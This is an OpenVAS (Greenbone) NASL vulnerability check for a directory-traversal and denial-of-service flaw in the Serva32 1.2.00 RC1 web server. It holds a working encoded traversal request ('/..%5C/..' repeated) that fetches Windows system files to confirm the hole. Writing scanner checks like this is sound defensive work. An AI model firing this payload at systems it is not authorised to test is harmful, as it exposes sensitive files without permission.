###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_serva32_47760.nasl 12018 2018-10-22 13:31:29Z mmartin $
#
# Serva32 Directory Traversal and Denial of Service Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103160");
  script_version("$Revision: 12018 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 15:31:29 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-05-12 13:24:44 +0200 (Thu, 12 May 2011)");
  script_bugtraq_id(47760);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Serva32 Directory Traversal and Denial of Service Vulnerabilities");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/47760");
  script_xref(name:"URL", value:"http://www.vercot.com/~serva/");

  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Serva32/banner");

  script_tag(name:"impact", value:"Exploiting these issues will allow attackers to obtain sensitive
 information or cause denial-of-service conditions.");
  script_tag(name:"affected", value:"Serva32 1.2.00 RC1 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution", value:"Upgrade to Serva32 Version 1.2.1 or later.");
  script_tag(name:"summary", value:"Serva32 is prone to a directory-traversal vulnerability and a denial-of-
 service vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if(!banner || "Server: Serva32" >!< banner)exit(0);

files = traversal_files("windows");

foreach file(keys(files)) {

  url = "/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/" + files[file];

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
